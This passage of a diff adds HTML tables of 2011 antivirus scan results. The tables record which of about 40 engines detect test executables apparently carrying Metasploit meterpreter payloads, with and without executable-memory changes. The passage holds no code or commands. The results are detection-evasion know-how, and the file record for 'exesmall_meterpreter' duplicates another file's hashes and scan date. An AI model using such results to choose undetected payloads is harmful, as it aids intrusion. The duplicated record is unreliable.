+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9822</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 08408325f4b213d3397942548f8b7d73</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 45e88b91937d49e650b933082277ee30e9ccc3d6</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> e7b9c016d5b099370b6a664d8a8bc2fdbab25524aa61963b137b29256ce14437</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 70145 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 11:08:45 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>notepad_none_norwx</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9337</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td class="positive">Heuristic.LooksLike.Win32.Suspicious.J!80</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9823</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 8af8fa0d364b61b63a6d95dadd06b0c5</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 9924993eb0e578d69f6045e59a1705053a9819b3</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 387fe8b710782d5358da4c2e590f4c693dbd9d11944b2707dcf00d28348b830a</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 45612 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 12:00:12 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>exesmall_meterpreter</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9337</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td class="positive">Heuristic.LooksLike.Win32.Suspicious.J!80</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9823</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 8af8fa0d364b61b63a6d95dadd06b0c5</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 9924993eb0e578d69f6045e59a1705053a9819b3</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 387fe8b710782d5358da4c2e590f4c693dbd9d11944b2707dcf00d28348b830a</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 45612 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 12:00:12 (UTC)</td>
+     </tr>
+ </table>
+
+<h2>exesmall_none</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9337</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td class="positive">Heuristic.LooksLike.Win32.Suspicious.J!80</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9823</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.116.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 4853b2a430fdd90c624a98013767e1fe</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> 66f179cd4f38b6d2b0952c1db4890dc19fe79015</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 44ad92d3b918dff3b847e473e9d21a0741087b44df588354ce57d4ac1646d1b1</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 45592 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-10 11:55:31 (UTC)</td>
+     </tr>
+ </table>
+ 
+<h2>exesmall_meterpreter_norwx</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9337</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.108.4891</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.10</td>
+         <td class="positive">HEUR:Trojan.Win32.Generic</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.10</td>
+         <td class="positive">Trojan:Win32/Swrort.A</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6280</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.10</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-10.01</td>
+         <td>2011.07.10</td>
+         <td class="positive">Backdoor.Shell.AC</td>
+     </tr>
+     <tr>
